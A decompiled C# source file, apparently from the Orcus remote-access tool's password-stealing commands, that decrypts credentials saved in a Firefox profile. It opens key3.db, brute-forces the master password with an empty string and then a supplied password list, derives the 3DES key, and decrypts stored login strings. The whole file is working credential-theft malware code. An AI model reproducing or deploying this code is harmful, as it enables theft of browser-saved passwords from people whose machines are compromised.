using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Orcus.Commands.Passwords.Applications.Mozilla.Cryptography;
using Orcus.Shared.Utilities;

namespace Orcus.Commands.Passwords.Applications.Mozilla;

public class MozillaDecryptor
{
	private byte[] _privateKey;

	public string[] PasswordList { get; set; }

	public MozillaDecryptor()
	{
	}

	public MozillaDecryptor(string[] passwordList)
	{
		PasswordList = passwordList;
	}

	public bool Initialize(string profilePath)
	{
		_003C_003Ec__DisplayClass7_0 CS_0024_003C_003E8__locals0 = default(_003C_003Ec__DisplayClass7_0);
		BerkeleyDb berkeleyDb = new BerkeleyDb(Path.Combine(profilePath, "key3.db"));
		CS_0024_003C_003E8__locals0.pwdCheck = new PasswordCheck((from p in berkeleyDb.Keys
			where p.Key.Equals("password-check")
			select p.Value).First().Replace("-", ""));
		string text = (from p in berkeleyDb.Keys
			where p.Key.Equals("global-salt")
			select p.Value).First().Replace("-", "");
		CS_0024_003C_003E8__locals0.globalSaltBytes = StringExtensions.HexToBytes(text);
		CS_0024_003C_003E8__locals0.pwdCheckSaltBytes = StringExtensions.HexToBytes(CS_0024_003C_003E8__locals0.pwdCheck.EntrySalt);
		string text2 = "";
		if (!CheckPassword7_(text2))
		{
			bool flag = false;
			string[] passwordList = PasswordList;
			if (passwordList != null && passwordList.Length != 0)
			{
				string[] passwordList2 = PasswordList;
				for (int i = 0; i < passwordList2.Length; i++)
				{
					if (flag = CheckPassword7_(text2 = passwordList2[i]))
					{
						break;
					}
				}
			}
			if (!flag)
			{
				return false;
			}
		}
		Asn1DerObject asn1DerObject = Asn1Der.Parse(StringExtensions.HexToBytes((from p in berkeleyDb.Keys
			where !p.Key.Equals("global-salt") && !p.Key.Equals("Version") && !p.Key.Equals("password-check")
			select p.Value).First().Replace("-", "")));
		MozillaPBE mozillaPBE = new MozillaPBE(StringExtensions.HexToBytes(text), Encoding.ASCII.GetBytes(text2), asn1DerObject.Objects[0].Objects[0].Objects[1].Objects[0].Data);
		mozillaPBE.Compute();
		Asn1DerObject asn1DerObject2 = Asn1Der.Parse(Asn1Der.Parse(TripleDesHelper.DescbcDecryptorByte(mozillaPBE.Key, mozillaPBE.IV, asn1DerObject.Objects[0].Objects[1].Data)).Objects[0].Objects[2].Data);
		if (asn1DerObject2.Objects[0].Objects[3].Data.Length > 24)
		{
			_privateKey = new byte[24];
			Array.Copy(asn1DerObject2.Objects[0].Objects[3].Data, asn1DerObject2.Objects[0].Objects[3].Data.Length - 24, _privateKey, 0, 24);
		}
		else
		{
			_privateKey = asn1DerObject2.Objects[0].Objects[3].Data;
		}
		return true;
		bool CheckPassword7_(string password)
		{
			MozillaPBE mozillaPBE2 = new MozillaPBE(CS_0024_003C_003E8__locals0.globalSaltBytes, Encoding.ASCII.GetBytes(password), CS_0024_003C_003E8__locals0.pwdCheckSaltBytes);
			mozillaPBE2.Compute();
			return TripleDesHelper.DescbcDecryptor(mozillaPBE2.Key, mozillaPBE2.IV, StringExtensions.HexToBytes(CS_0024_003C_003E8__locals0.pwdCheck.Passwordcheck)).StartsWith("password-check");
		}
	}

	public string DecryptString(string encryptedString)
	{
		return DecryptData(Convert.FromBase64String(encryptedString));
	}

	public string DecryptData(byte[] data)
	{
		Asn1DerObject asn1DerObject = Asn1Der.Parse(data);
		return Regex.Replace(TripleDesHelper.DescbcDecryptor(_privateKey, asn1DerObject.Objects[0].Objects[1].Objects[1].Data, asn1DerObject.Objects[0].Objects[2].Data), "[^\\u0020-\\u007F]", "");
	}
}
